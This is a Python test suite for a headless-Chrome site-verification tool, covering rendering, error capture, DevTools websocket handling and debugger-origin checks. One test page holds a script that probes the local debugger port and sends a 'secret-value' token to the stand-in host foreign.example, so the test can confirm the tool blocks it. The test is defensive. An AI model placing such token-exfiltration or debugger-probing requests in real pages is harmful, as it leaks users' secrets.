import json
import pathlib
import socket
import threading
import os
import shutil
import subprocess
import tempfile
import time
from contextlib import contextmanager
import sys
import unittest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))
from cdp import CdpConnection, page_target



class SiteVerificationTests(unittest.TestCase):
    @contextmanager
    def browser(self):
        executable = os.environ.get("POLYCHAT_TEST_CHROME") or shutil.which("chromium") or shutil.which("google-chrome")
        mac_chrome = pathlib.Path("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome")
        if not executable and mac_chrome.exists():
            executable = str(mac_chrome)
        if not executable:
            self.skipTest("Chrome is required for browser capture integration")
        with socket.socket() as debugger_probe:
            if debugger_probe.connect_ex(("127.0.0.1", 9222)) == 0:
                self.skipTest("The browser debugger port is already in use")
        with tempfile.TemporaryDirectory(prefix="polychat-sites-chrome-") as profile:
            process = subprocess.Popen([executable, "--headless", "--no-sandbox", "--disable-gpu", "--no-first-run", "--no-default-browser-check", "--remote-debugging-port=9222", "--remote-debugging-address=127.0.0.1", f"--user-data-dir={profile}", "about:blank"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            try:
                deadline = time.monotonic() + 10
                while True:
                    try:
                        page_target()
                        break
                    except Exception:
                        if process.poll() is not None or time.monotonic() >= deadline:
                            raise RuntimeError("Temporary Chrome debugger did not start")
                        time.sleep(0.05)
                yield
            finally:
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
                    process.wait()

    def capture(self, document, viewport="desktop", interactions=None):
        with self.browser():
            payload = {"allowedOrigins": [], "viewport": viewport, "document": document, "elementKeys": ["page"], "interactions": interactions or []}
            result = subprocess.run([sys.executable, str(pathlib.Path(__file__).resolve().parents[1] / "verify-site.py")], input=json.dumps(payload), capture_output=True, text=True, timeout=30, check=True)
            return json.loads(result.stdout)

    def test_renders_and_checks_button_visibility_in_real_browser(self):
        document = """<html><body><div id="site-root"><section data-site-key="page"><div data-site-key="show"><button onclick="document.getElementById('result').hidden=false">Show</button></div><div id="result" data-site-key="result" hidden>Saved</div></section></div></body></html>"""
        for viewport in ["desktop", "mobile"]:
            with self.subTest(viewport=viewport):
                result = self.capture(document, viewport, [{"elementKey": "show", "expectVisible": "result"}])
                self.assertEqual(result, {"status": "passed", "diagnostics": []})

    def test_captures_real_errors_and_blocks_unapproved_requests(self):
        document = """<html><body><div id="site-root"><section data-site-key="page">Test</section></div><script>console.error('Broken'); setTimeout(() => { throw new Error('Page failed'); }, 0); fetch('http://127.0.0.1:9222/json/list').catch(() => {}); fetch('https://foreign.example/private?token=secret-value').catch(() => {});</script></body></html>"""
        result = self.capture(document)
        self.assertEqual(result["status"], "failed")
        self.assertTrue({"console", "page_error", "request_failure"}.issubset({item["kind"] for item in result["diagnostics"]}))
        self.assertNotIn("secret-value", json.dumps(result))

    def test_cdp_waits_without_consuming_partial_messages(self):
        client, server = socket.socketpair()
        connection = CdpConnection.__new__(CdpConnection)
        connection.socket = client
        connection.waiting = {1}
        connection.responses = {}
        connection.on_event = lambda message: None
        try:
            connection.pump(0.001)
            body = json.dumps({"id": 1, "result": {"ready": True}}).encode()
            frame = bytes([0x81, len(body)]) + body
            server.sendall(frame[:1])
            timer = threading.Timer(0.05, lambda: server.sendall(frame[1:]))
            timer.start()
            connection.pump(0.005)
            timer.join()
            self.assertTrue(connection.responses[1]["result"]["ready"])
        finally:
            connection.close()
            server.close()

    def test_rejects_nonlocal_browser_debugger(self):
        with self.assertRaisesRegex(RuntimeError, "destination"):
            CdpConnection("ws://foreign.example:9222/page")


if __name__ == "__main__":
    unittest.main()
